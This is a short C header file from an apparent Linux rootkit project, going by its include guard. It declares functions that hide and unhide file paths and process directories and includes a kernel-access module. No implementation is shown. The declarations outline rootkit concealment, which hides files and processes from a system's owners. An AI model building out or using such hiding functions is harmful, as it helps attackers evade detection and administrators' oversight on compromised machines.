//
// Created by idan on 1/11/24.
//

#ifndef ROOTKIT_FILE_HIDING_ACCESS_H
#define ROOTKIT_FILE_HIDING_ACCESS_H

#include "../kernel_access/kernel_access.h"

// hides files and directories. this is really useful as almost anything in unix is a file

void hide_absolute_path(const char *path);
void unhide_absolute_path(const char *path);

void hide_process_dir(int pid);
void unhide_process_dir(int pid);

void reports_test();

#endif //ROOTKIT_FILE_HIDING_ACCESS_H
